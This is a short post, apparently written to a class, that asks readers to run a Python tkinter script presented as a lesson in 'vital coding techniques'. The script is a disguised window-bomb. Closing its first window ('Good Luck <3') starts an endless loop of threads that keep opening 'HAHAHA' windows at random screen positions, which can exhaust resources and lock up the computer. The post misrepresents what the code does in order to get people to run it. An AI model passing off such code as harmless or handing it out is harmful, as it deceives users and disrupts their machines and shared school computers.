Okay people, im going to need you all to run this code next lesson on the computers, its a demonstration of some vital coding techniques.

from tkinter import *
import threading
import random

def open_second_window():
    second_window = Tk()
    second_window.title("Second Window")
    width = 300
    height = 200
    screen_width = second_window.winfo_screenwidth()
    screen_height = second_window.winfo_screenheight()
    x_offset = random.randint(0, screen_width - width)
    y_offset = random.randint(0, screen_height - height)
    second_window.geometry(f"{width}x{height}+{x_offset}+{y_offset}")
    label = Label(second_window, text="HAHAHA", font=("Arial", 20))
    label.pack(padx=50, pady=50)
    second_window.mainloop()

def close_first_window():
    root.destroy()
    while True:
        threading.Thread(target=open_second_window).start()
        threading.Thread(target=open_second_window).start()

root = Tk()
root.title("First Window")
label = Label(root, text="Good Luck <3", font=("Arial", 20))
label.pack(padx=50, pady=50)
root.protocol("WM_DELETE_WINDOW", close_first_window)
root.mainloop()
